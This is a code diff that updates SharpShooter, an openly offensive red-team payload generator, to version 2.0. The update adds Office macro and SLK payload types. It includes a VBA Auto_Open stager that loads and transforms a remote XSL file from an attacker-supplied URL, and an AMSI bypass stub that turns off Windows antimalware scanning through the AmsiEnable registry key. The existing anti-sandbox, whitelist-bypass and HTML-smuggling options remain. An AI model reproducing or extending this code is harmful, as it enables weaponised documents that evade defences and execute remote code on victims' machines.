@@ -5,7 +5,7 @@
 # SharpShooter:
 #   Payload Generation with CSharp and DotNetToJScript
 # Version:
-#   1.0
+#   2.0
 # Author:
 #   Dominic Chell (@domchell), MDSec ActiveBreach (@mdseclabs)
 
@@ -41,7 +41,7 @@ class SharpShooter:
     /____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                          /_/                                            
 
-     \033[1;32mDominic Chell, @domchell, MDSec ActiveBreach, v1.0\033[0;0m
+     \033[1;32mDominic Chell, @domchell, MDSec ActiveBreach, v2.0\033[0;0m
     """
 
     def validate_args(self):
@@ -59,7 +59,7 @@ class SharpShooter:
         parser.add_argument("--com", metavar="<com>", dest="comtechnique", default=None, help="COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote")
         parser.add_argument("--awl", metavar="<awl>", dest="awltechnique", default=None, help="Application Whitelist Bypass Technique: wmic, regsvr32")
         parser.add_argument("--awlurl", metavar="<awlurl>", dest="awlurl", default=None, help="URL to retrieve XSL/SCT payload")
-        parser.add_argument("--payload", metavar="<format>", dest="payload", default=None, help="Payload type: hta, js, jse, vba, vbe, vbs, wsf")
+        parser.add_argument("--payload", metavar="<format>", dest="payload", default=None, help="Payload type: hta, js, jse, vbe, vbs, wsf, macro, slk")
         parser.add_argument("--sandbox", metavar="<types>", dest="sandbox", default=None, help="Anti-sandbox techniques: " + antisandbox)
         parser.add_argument("--amsi", metavar="<amsi>", dest="amsi", default=None, help="Use amsi bypass technique: amsienable")
         parser.add_argument("--delivery", metavar="<type>", dest="delivery", default=None, help="Delivery method: web, dns, both")
@@ -77,23 +77,24 @@ class SharpShooter:
 
         args = parser.parse_args()
 
-        if not args.dotnetver:
+        if not args.dotnetver and not args.payload=="slk":
             print("\033[1;31m[!]\033[0;0m Missing --dotnetver argument")
             sys.exit(-1)
         else:
-            try:
-                dotnetver = int(args.dotnetver)
+            if not args.payload=="slk":
+                try:
+                    dotnetver = int(args.dotnetver)
 
-                if (not dotnetver == 2 and not dotnetver == 4):
-                    raise Exception
-            except Exception as e:
-                print("\033[1;31m[!]\033[0;0m Invalid .NET version")
-                sys.exit(-1)
+                    if (not dotnetver == 2 and not dotnetver == 4):
+                        raise Exception
+                except Exception as e:
+                    print("\033[1;31m[!]\033[0;0m Invalid .NET version")
+                    sys.exit(-1)
 
         if not args.payload:
             print("\033[1;31m[!]\033[0;0m Missing --payload argument")
             sys.exit(-1)
-        if not args.delivery and not args.stageless:
+        if not args.delivery and not args.stageless and not args.payload=="slk":
             print("\033[1;31m[!]\033[0;0m Missing --delivery argument")
             sys.exit(-1)
         if not args.output:
@@ -120,12 +121,12 @@ class SharpShooter:
             print("\033[1;31m[!]\033[0;0m Invalid delivery method")
             sys.exit(-1)
 
-        if(not args.shellcode and not args.stageless):
+        if(not args.shellcode and not args.stageless and not args.payload=="slk"):
             if not args.refs or not args.namespace or not args.entrypoint:
                 print("\033[1;31m[!]\033[0;0m Custom CSharp selected, --refs, --namespace and --entrypoint arguments required")
                 sys.exit(-1)
         else:
-            if(not args.shellcode_file and not args.stageless):
+            if(not args.shellcode_file and not args.stageless and not args.payload=="slk"):
                 print("\033[1;31m[!]\033[0;0m Built-in CSharp template selected, --scfile argument required")
                 sys.exit(-1)
 
@@ -142,6 +143,21 @@ class SharpShooter:
             if not args.awlurl:
                 print("\033[1;31m[!]\033[0;0m --awlurl required when COM staging")
                 sys.exit(-1)
+
+        if(args.payload == "macro" and args.smuggle):
+            print("\033[1;31m[!]\033[0;0m Macro payload cannot be smuggled")
+            sys.exit(-1)
+
+        if(args.payload == "macro" and not args.comtechnique=="xslremote"):
+            print("\033[1;31m[!]\033[0;0m Macro payload requires the --com xsmlremote and --awlurl arguments")
+            sys.exit(-1)
+
+        if(args.payload == "slk" and args.comtechnique):
+            print("\033[1;31m[!]\033[0;0m SLK payloads do not currently support COM staging")
+            sys.exit(-1)
+
+        if(args.payload == "slk"):
+            print("\033[1;31m[!]\033[0;0m Shellcode must not contain null bytes")
 
         return args
 
@@ -191,18 +207,57 @@ class SharpShooter:
         shellcode_gzip = ""
         payload_type = 0
 
+        macro_template = """    Set XML = CreateObject("Microsoft.XMLDOM")
+    XML.async = False
+    Set xsl = XML
+    xsl.Load "%s"
+    XML.transformNode xsl""" % (args.awlurl)
+
+        macro_amsi_stub = """    regpath = "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable"
+    Set oWSS = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
+    e = 0
+    On Error Resume Next
+    r = oWSS.RegRead(regpath)
+    If r <> 0 Then
+        oWSS.RegWrite regpath, "0", "REG_DWORD"
+        e = 1
+    End If
+
+    If Err.Number <> 0 Then
+        oWSS.RegWrite regpath, "0", "REG_DWORD"
+        e = 1
+    Err.Clear
+    End If
+
+%s
+
+    If e Then
+        oWSS.RegWrite regpath, "1", "REG_DWORD"
+    End If
+
+    On Error GoTo 0""" % (macro_template)
+
+        macro_stager = """Sub Auto_Open()
+%MACRO_CODE%
+End Sub"""
+
+        if(args.amsi and args.payload=="macro"):
+            macro_stager = macro_stager.replace("%MACRO_CODE%", macro_amsi_stub)
+        else:
+            macro_stager = macro_stager.replace("%MACRO_CODE%", macro_template)
+
         dotnet_version = 1
-
-        dotnet_version = int(args.dotnetver)
-
         stageless_payload = False
-        
-        if((args.stageless or stageless_payload is True) and dotnet_version == 2):
-            template_base = "templates/stageless."
-        elif((args.stageless or stageless_payload is True) and dotnet_version == 4):
-            template_base = "templates/stagelessv4."
-        elif(dotnet_version == 4):
-            template_base = "templates/sharpshooterv4."
+
+        if not args.payload=="slk":
+            dotnet_version = int(args.dotnetver)
+            
+            if((args.stageless or stageless_payload is True) and dotnet_version == 2):
+                template_base = "templates/stageless."
+            elif((args.stageless or stageless_payload is True) and dotnet_version == 4):
+                template_base = "templates/stagelessv4."
+            elif(dotnet_version == 4):
+                template_base = "templates/sharpshooterv4."
 
         #print(template_base)
 
@@ -220,10 +275,14 @@ class SharpShooter:
             payload_type = 6
         elif(args.payload == "wsf"):
             payload_type = 7
+        elif(args.payload == "macro"):
+            payload_type = 8
+        elif(args.payload == "slk"):
+            payload_type = 9
 
         try:
             payload_type = int(payload_type)
-            if (payload_type < 1 or payload_type > 7):
+            if (payload_type < 1 or payload_type > 9):
                 raise Exception
 
             if(payload_type == 1):
@@ -258,6 +317,11 @@ class SharpShooter:
             elif(payload_type == 7):
                 template_body = self.read_file(template_base + "js")
                 file_type = "wsf"
+            elif(payload_type == 8):
+                template_body = self.read_file(template_base + "js")
+                file_type = "macro"
+            elif(payload_type == 9):
+                file_type = "slk"
         except Exception as e:
             print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
 
@@ -435,13 +499,18 @@ class SharpShooter:
         amsi_bypass = ""
         outputfile = args.output
         outputfile_payload = outputfile + "." + file_type
-        if args.amsi:
-            amsi_bypass = amsikiller.amsi_stub(file_type, args.amsi, outputfile_payload)
 
-            if "vb" in file_type or "hta" in file_type:
-                template_code = amsi_bypass + template_code + "\nOn Error Goto 0\nEnd If"
-            else:
+        if args.amsi and not args.payload == "macro":
+            if(args.comtechnique):
+                amsi_bypass = amsikiller.amsi_stub("js", args.amsi, outputfile_payload)
                 template_code = amsi_bypass + template_code + "}"
+            else:
+                amsi_bypass = amsikiller.amsi_stub(file_type, args.amsi, outputfile_payload)
+
+                if "vb" in file_type or "hta" in file_type:
+                    template_code = amsi_bypass + template_code + "\nOn Error Goto 0\nEnd If"
+                else:
+                    template_code = amsi_bypass + template_code + "}"
 
         #print(template_code)
 
@@ -472,6 +541,8 @@ class SharpShooter:
             payload = harness.replace("%B64PAYLOAD%", payload_encoded)
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
             payload_minified = jsmin(payload)
+        elif("slk" in file_type):
+            pass
         else:
             harness = self.read_file("templates/harness.vbs")
             payload = harness.replace("%B64PAYLOAD%", payload_encoded)
@@ -482,11 +553,14 @@ class SharpShooter:
         elif (payload_type == 5):
             file_type = "vbe"
 
-        
         f = open("output/" + outputfile_payload, 'w')
-        
         #print(payload)
+        if(payload_type == 8):
+            f.write(macro_stager)
 
+        if(payload_type == 9):
+            payload = excel4.generate_slk(args.rawscfile)
+        
         if(args.comtechnique):
             if not args.awltechnique or args.awltechnique == "wmic":
                 payload_file = "output/" + outputfile + ".xsl"
@@ -494,7 +568,7 @@ class SharpShooter:
                 payload_file = "output/" + outputfile + ".sct"
 
             #if("js" in file_type or "hta" in file_type or "wsf" in file_type):
-            awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, awl_payload_simple)
+            awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, awl_payload_simple, args.amsi)
             #else:
             #    awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, payload)
             f.write(awl_payload)
@@ -514,16 +588,11 @@ class SharpShooter:
                 print("\033[1;34m[*]\033[0;0m Written shellcode payload to output/%s" % outputfile_shellcode)
 
         if "vba" not in file_type:
-            smuggle = "n"
-            if(args.smuggle):
-                    smuggle = "y"
-
-            if (smuggle == "y" or smuggle == "yes"):
+            if (args.smuggle):
                 key = self.rand_key(10)
                 template = ""
                 template = args.template
                 embedinhtml.run_embedInHtml(key, "./output/" + outputfile_payload, "./output/" + outputfile + ".html", template)
-
 if __name__ == "__main__":
     ss = SharpShooter()
     args = ss.validate_args()
